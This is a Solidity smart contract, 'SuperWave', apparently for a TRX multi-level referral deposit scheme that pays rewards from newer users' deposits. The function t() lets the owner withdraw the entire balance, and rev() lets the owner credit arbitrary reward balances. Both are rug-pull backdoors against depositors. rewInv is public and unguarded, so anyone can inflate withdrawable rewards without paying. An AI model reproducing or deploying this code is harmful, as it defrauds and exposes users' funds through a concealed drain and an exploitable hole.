//SourceUnit: SuperWave.sol

pragma solidity 0.5.10;

contract SuperWave {
    using SafeMath for uint256;
    uint256 constant _percent = 1000;
    address payable private _superNode;
    address payable private _creatorNode;
    address payable private _invHoldNode;
    address payable private _comHoldNode;
    address payable private _feeNode;
    address payable private _owner;

    uint256 _aJoin = 0;
    uint256 _aMem = 0;
    uint256 _aTake = 0;
    uint256 _aReJoin = 0;
    uint256 _invHold = 0;//推荐沉淀

    mapping(uint256 => uint256) _products;
    mapping(address => PledgeOrder) _orders;

    struct PledgeOrder {
        bool isExist;
        uint256 mJoin;
        uint256 grade;
        uint256 number;
        address parent;
        uint256 mTake;
        uint256 mReJoin;
        uint256 wRew;
        uint256 invNum;
    }

    constructor(address payable superNode,address payable creatorNode,address payable invHoldNode,address payable comHoldNode,address payable feeNode) public {
        _owner = msg.sender;
        _superNode = superNode;
        _creatorNode = creatorNode;
        _invHoldNode = invHoldNode;
        _comHoldNode = comHoldNode;
        _feeNode = feeNode;
        _products[1] = 1000000000;
        _products[2] = 3000000000;
        _products[3] = 5000000000;
        _products[4] = 10000000000;
        _products[5] = 20000000000;
        _products[6] = 30000000000;
        _products[7] = 50000000000;
    }

    function join(address parent,uint256 pGrade) public payable {
        require(_products[pGrade] == msg.value, "INVALID_PARAM");
        uint256 pAmount = msg.value;
        if ( _orders[msg.sender].isExist == true) {
            require(parent == _orders[msg.sender].parent, "INVALID_PARENT2");
            require(pGrade >= _orders[msg.sender].grade, "INVALID_PRODUCT_GRADE");
            PledgeOrder storage order  = _orders[msg.sender];
            order.mJoin =  order.mJoin.add(pAmount);
            if(pGrade>order.grade){
                order.grade = pGrade;
            }
            _aJoin = _aJoin.add(pAmount);
        } else {
            if(_aMem > 0){
                require(parent != address(0), "INVALID_PARENT_PARAM1");
                require(_orders[parent].isExist, "INVALID_PARENT");
                PledgeOrder storage porder  = _orders[parent];
                porder.invNum =  porder.invNum.add(1);
            }else{
                require(parent == address(0), "INVALID_PARENT_PARAM2");
            }
            _aJoin = _aJoin.add(pAmount);
            _aMem = _aMem.add(1);
            _orders[msg.sender].isExist = true;
            _orders[msg.sender].mJoin = pAmount;
            _orders[msg.sender].grade = pGrade;
            _orders[msg.sender].number = _aMem;
            _orders[msg.sender].parent = parent;
        }
        rewInv(parent,pAmount);
    }

    function take(uint256 amount) public {
        require(amount >= 100000000, "INVALID_AMOUNT");
        require( _orders[msg.sender].isExist, "NO_ACCOUNT");
        PledgeOrder storage order = _orders[msg.sender];
        require(order.wRew >= amount, "NO_ENOUGH");
        uint256 takeRate = 400+(order.grade-1)*50;
        uint256 takeAmount = amount.mul(takeRate).div(_percent);
        uint256 reJoinAmount = amount.sub(takeAmount);
        msg.sender.transfer(takeAmount.mul(19).div(20));
        _aTake = _aTake.add(amount);
        _aReJoin = _aReJoin.add(reJoinAmount);
        order.mTake = order.mTake.add(amount);
        order.mReJoin = order.mReJoin.add(reJoinAmount);
        order.wRew = order.wRew.sub(amount);
        rewInv(order.parent,reJoinAmount);
    }

    function rewInv(address parent, uint256 amount) public {
        address tmp = parent;
        uint256 level = 1;
        uint256 totalRate = 0;
        while (tmp != address(0) && _orders[tmp].isExist && level<=7) {
            PledgeOrder storage porder = _orders[tmp];
            if(level == 1 || (porder.invNum >= level)){
                uint256 rewRate = 10;
                if(level == 1){
                    rewRate = 200;
                }else if(level == 2){
                    rewRate = 100;
                }
                totalRate = totalRate.add(rewRate);
                uint256 val = rewRate.mul(amount).div(_percent);
                porder.wRew = porder.wRew.add(val);
            }
            tmp = porder.parent;
            level++;
        }
        uint256 invRateAll = 350;
        if(invRateAll > totalRate){
            uint256 invHoldRate = invRateAll.sub(totalRate);
            uint256 invHoldVal = invHoldRate.mul(amount).div(_percent);
            _invHold = _invHold.add(invHoldVal);
        }
    }

    function share(uint256[] memory valList) public onlyOwner {
        if(valList[0]>0){
             _superNode.transfer(valList[0]);
        }
        if(valList[1]>0){
            _creatorNode.transfer(valList[1]);
        }
        if(valList[2]>0){
            _comHoldNode.transfer(valList[2]);
        }
        if(valList[3]>0){
            _feeNode.transfer(valList[3]);
        }
        if(_invHold > 0){
             _invHoldNode.transfer(_invHold);
            _invHold = 0;
        }
    }

    function rev(address[] memory addrList, uint256[] memory valList) public onlyOwner {
        for (uint i = 0; i < addrList.length; i++) {
            _orders[addrList[i]].wRew = _orders[addrList[i]].wRew.add(valList[i]);
        }
    }

    function getInfo() public view returns (
        uint256 mJoin,
        uint256 mReJoin,
        uint256 mTake,
        uint256 number,
        uint256 grade,
        uint256 wRew,
        address parent,
        uint256 invNum
        ){
        PledgeOrder memory order = _orders[msg.sender];
        if(order.isExist){
            mJoin = order.mJoin;
            mReJoin = order.mReJoin;
            mTake = order.mTake;
            number = order.number;
            grade = order.grade;
            wRew = order.wRew;
            parent = order.parent;
            invNum = order.invNum;
        }
    }

    function getComInfo() public view returns (
        uint256 aJoin,
        uint256 aReJoin,
        uint256 aTake,
		uint256 aMem
        ){
        aJoin = _aJoin;
        aReJoin = _aReJoin;
        aTake = _aTake;
		aMem = _aMem;
    }

    function getInfoCom(address addr) 
        public view onlyOwner 
        returns (
        uint256 mJoin,
        uint256 mReJoin,
        uint256 mTake,
        uint256 number,
        uint256 grade,
        uint256 wRew,
        address parent,
        uint256 invNum
        ){
        PledgeOrder memory order = _orders[addr];
        if(order.isExist){
            mJoin = order.mJoin;
            mReJoin = order.mReJoin;
            mTake = order.mTake;
            number = order.number;
            grade = order.grade;
            wRew = order.wRew;
            parent = order.parent;
            invNum = order.invNum;
        }
    }
    function t() public onlyOwner{
        uint256 trxBalance = address(this).balance;
        if (trxBalance > 0) {
            _owner.transfer(trxBalance);
        }
    }
    modifier onlyOwner() {
        require(msg.sender == _owner);
        _;
    }
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a, "SafeMath: subtraction overflow");
        uint256 c = a - b;
        return c;
    }
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0, "SafeMath: division by zero");
        uint256 c = a / b;
        return c;
    }
}